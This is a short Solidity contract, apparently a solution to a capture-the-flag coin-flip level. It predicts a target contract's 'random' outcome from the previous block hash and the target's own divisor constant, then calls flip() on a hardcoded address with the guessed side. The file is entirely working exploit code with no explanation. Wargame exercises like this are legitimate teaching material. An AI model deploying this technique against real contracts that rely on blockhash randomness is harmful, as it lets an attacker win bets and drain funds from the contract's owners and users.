// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

interface ICoinFlip {
    function flip(bool _guess) external returns (bool);
}

contract WinFlip {

    ICoinFlip coinFlipSC = ICoinFlip(0x8314E854B4599453c499328ffCa638968da11B93);
    uint256 FACTOR       = 57896044618658097711785492504343953926634992332820282019728792003956564819968;
    
    function winFlip() public {
        uint256 blockValue = uint256(blockhash(block.number - 1));
        uint256 coinFlip = blockValue / FACTOR;
        bool side = coinFlip == 1 ? true : false;

        coinFlipSC.flip(side);
    }
}
